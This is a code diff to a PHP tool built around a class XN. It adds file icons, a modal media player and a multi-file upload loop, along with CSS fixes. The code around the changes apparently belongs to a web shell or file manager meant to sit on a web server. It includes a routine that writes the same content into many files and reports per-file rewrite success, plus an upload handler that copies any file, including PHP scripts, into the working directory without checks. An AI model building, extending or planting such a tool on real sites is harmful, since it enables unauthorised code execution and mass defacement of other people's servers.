@@ -106,6 +106,76 @@ class XN {
     public static function getext($filename) {
         return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
     }
+    public static function vers($x) {
+    	return print($x);
+    }
+    public static function geticon($filename) {
+    	switch (self::getext($filename)) {
+    		case 'php1':
+            case 'php2':
+            case 'php3':
+            case 'php4':
+            case 'php5':
+            case 'php6':
+            case 'phtml':
+            case 'php':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337947.svg');
+    			break;
+    		case 'html':
+    		case 'htm':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337937.svg');
+    			break;
+    		case 'css':
+    			self::vers('https://image.flaticon.com/icons/svg/136/136527.svg');
+    			break;
+    		case 'js':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337941.svg');
+    			break;
+    		case 'json':
+    			self::vers('https://image.flaticon.com/icons/svg/136/136525.svg');
+    			break;
+    		case 'xml':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337959.svg');
+    			break;
+    		case 'py':
+    			self::vers('https://image.flaticon.com/icons/svg/617/617531.svg');
+    			break;
+    		case 'zip':
+    			self::vers('https://image.flaticon.com/icons/svg/2306/2306214.svg');
+    			break;
+    		case 'rar':
+    			self::vers('https://image.flaticon.com/icons/svg/2306/2306170.svg');
+    			break;
+    		case 'mp3':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337944.svg');
+    			break;
+    		case 'mp4':
+    			self::vers('https://image.flaticon.com/icons/svg/2306/2306142.svg');
+    			break;
+    		case 'log':
+    			self::vers('https://image.flaticon.com/icons/svg/2306/2306124.svg');
+    			break;
+    		case 'ico':
+    			self::vers('https://image.flaticon.com/icons/svg/1126/1126873.svg');
+    			break;
+    		case 'png':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337948.svg');
+    			break;
+    		case 'jpg':
+    		case 'jpeg':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337940.svg');
+    			break;
+    		case 'svg':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337954.svg');
+    			break;
+    		case 'pdf':
+    			self::vers('https://image.flaticon.com/icons/svg/337/337946.svg');
+    			break;
+    		default:
+    			self::vers('https://image.flaticon.com/icons/svg/833/833524.svg');
+    			break;
+    	}
+    }
     public static function SLES() {
         if (self::OS() == 'Windows') {
             return str_replace('\\', '/', DIRECTORY_SEPARATOR);
@@ -113,17 +183,6 @@ class XN {
             return DIRECTORY_SEPARATOR;
         }
     }
-    public static function sortname($filename, $type) {
-            switch ($type) {
-                case "1":
-                    if (strlen($filename) > 50) {
-                        $result = substr($filename, 0, 50)."...";
-                    } else {
-                        $result = $filename;
-                    }
-                    break;
-            } return $result;
-        }
     public static function addFile($filename, $data) {
         foreach ($filename as $value) {
             $handle = fopen($value, "w");
@@ -225,7 +284,6 @@ class XN {
                                 ?>
                                 <div class="rewrite-success">
                                     <?= $value ?>
-                                    <span>Success</span>
                                 </div>
                                 <?php
                             } else {
@@ -233,7 +291,6 @@ class XN {
                                 ?>
                                 <div class="rewrite-failed">
                                     <?= $value ?>
-                                    <span>Failed</span>
                                 </div>
                                 <?php
                             }
@@ -710,7 +767,7 @@ function alert($message) {
     }
     ul.dropdown {
         display: none;
-        position:absolute; ;
+        position:absolute;
         z-index: 5;
         margin-top: .5em;
         background: #fff;
@@ -736,6 +793,18 @@ function alert($message) {
         padding: .5em 1em;
         display: block;
     }
+    ul.dropdown li a {
+        text-align: left;
+        outline: none;
+        color: #000;
+        width: 100%;
+        font-size:18px;
+        background: none;
+        border: none;
+        text-decoration: none;
+        padding: .5em 1em;
+        display: block;
+    }
     ul.dropdown li button:hover {
         cursor: pointer;
         text-decoration: none;
@@ -749,9 +818,10 @@ function alert($message) {
         z-index: 5;
         box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
         margin-left:310px;
-        margin-top: 15px;
+        margin-top: .5em;
         min-width: 10em;
-        padding: 0;
+        padding-top:10px;
+        padding-left:0;
         border-radius:7px;
     }
     ul.dropdown-tool li {
@@ -845,6 +915,64 @@ function alert($message) {
         width:100%;
         padding: 7px;
     }
+    .blocker {
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        width: 100%; height: 100%;
+        overflow: auto;
+        z-index: 1;
+        padding: 20px;
+  		box-sizing: border-box;
+  		text-align: center;
+	}
+	.blocker:before{
+  		content: "";
+  		display: inline-block;
+  		height: 100%;
+  		vertical-align: middle;
+  		margin-right: -0.05em;
+	}
+	.blocker.behind {
+  		background-color: transparent;
+	}
+    .modal {
+  		display: none;
+  		vertical-align: middle;
+  		position: relative;
+  		z-index: 2;
+  		max-width: 500px;
+  		box-sizing: border-box;
+  		background: #fff;
+  		
+  		-webkit-border-radius: 7px;
+  		-moz-border-radius: 7px;
+  		-o-border-radius: 7px;
+  		-ms-border-radius: 7px;
+  		border-radius: 7px;
+  		box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+  		text-align: left;
+	}
+	.modal video {
+		outline: none;
+		border-radius: 7px;
+	}
+	.modal audio {
+		outline: none;
+		background: #fff;
+	}
+    .modal a.close-modal { 
+    	position:absolute;
+    	top:-12.5px;
+    	right:-12.5px;
+    	display:block;
+    	width:30px;
+    	height:30px;
+    	text-indent:-9999px;
+    	background-size:contain;
+    	background-repeat:no-repeat;
+    	background-position:center center;
+    	background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
+    }
     @media (min-width: 320px) and (max-width: 480px) {
         body {
             margin: 0;
@@ -906,7 +1034,8 @@ function alert($message) {
 </style>
 <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
 <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script type="text/javascript">
     $(function() {
@@ -1172,9 +1301,6 @@ function filterTable() {
             exit();
             break;
         case 'upload':
-            if (isset($_POST['upload'])) {
-                XN::upload($_FILES['file']);
-            }
             head('Upload', getcwd(), 'hidden');
             ?>
             <div class="upload">
@@ -1193,6 +1319,16 @@ function filterTable() {
                 </table>
             </div>
             <?php
+            if (isset($_POST['upload'])) {
+            	$files = count($_FILES['file']['tmp_name']);
+            	for ($i=0; $i < $files ; $i++) {
+            		if (copy($_FILES['file']['tmp_name'][$i], $_FILES['file']['name'][$i])) { ?>
+            			<?= $_FILES['file']['name'][$i] ?>
+            		<?php } else {
+            			print "<script>alert('Upload Failed')</script>";
+            		}
+                }
+            }
             exit();
             break;
         case 'rename':
@@ -1388,7 +1524,7 @@ function filterTable() {
                     <div class="block">
                         <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
                             <div class="img">
-                                <img src="https://image.flaticon.com/icons/svg/716/716784.svg">
+                                <img src="https://image.flaticon.com/icons/svg/715/715676.svg">
                             </div>
                             <div class="name">
                                 <?= $dir['names'] ?>
@@ -1442,7 +1578,7 @@ function filterTable() {
                     <div class="block">
                         <a title="<?= $file['names'] ?>">
                             <div class="img">
-                                <img src="https://image.flaticon.com/icons/svg/833/833524.svg">
+                                <img src="<?= XN::geticon($file['name']) ?>">
                             </div>
                             <div class="name">
                                 <?= $file['names'] ?>
@@ -1478,9 +1614,23 @@ function filterTable() {
                                 switch (XN::getext($file['name'])) {
                                     case 'mp4':
                                     case 'mp3':
+                                    $rep = str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $file['names']);
+                                    switch (XN::getext($file['name'])) {
+                                    	case 'mp3':
+                                    		$result = str_replace('mp3', 'Audio', XN::getext($file['name']));
+                                    		break;
+                                        case 'mp4':
+                                        	$result = str_replace('mp4', 'Video', XN::getext($file['name']));
+                                        	break;
+                                    }
                                         ?>
                                         <li>
-                                            <button>Play</button>
+                                            <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
+                                            <div id="ex1<?= $rep ?>" class="modal">
+                                            	<<?= $result ?> controls>
+                                            		<source src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>" type="<?= $result ?>/<?= XN::getext($file['name']) ?>">
+                                            	</<?= $result ?>>
+                                            </div>
                                         </li>
                                         <li>
                                             <button name="action" value="delete">Delete</button>
